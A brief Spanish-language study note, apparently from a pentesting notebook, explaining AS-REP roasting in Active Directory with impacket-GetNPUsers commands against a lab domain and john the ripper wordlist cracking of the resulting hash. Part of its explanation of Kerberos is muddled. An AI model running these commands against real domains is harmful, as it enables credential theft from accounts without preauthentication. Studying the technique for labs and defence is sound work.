- Tags: #ASREP-Roast #window #window_explotacion #enumeration_windows 

![](../../../attachments/Pasted%20image%2020260213003858.png)

Cuando un usuario no tiene activada la preautenticación esto implica que un atacante puede enviar una solicitud de autenticación sin tener que proporcionar ninguna prueba de identidad. Lo que pasa es que al momento de autenticar no se envía un TGT al dominio y se va a poder obtener la contraseña del usuario.

El ataque consiste en pedir un TGT del usuario que no tiene habilitada la preautenticación 


```bash
impacket-GetNPUsers domain/user -no-pass

impacket-GetNPUsers spookisec.local/svc-admin -no-pass
```

![](../../../attachments/Pasted%20image%2020260213004928.png)

El tiket obtnido lo guardamos en un archivo hash y no intentamos crackear el hash con john the ripper

```bash
john --wordlist=passwords.txt file

john --wordlist=passwords.txt hash
```

Si el pass es débil la obtendríamos a partir de este hash obtenido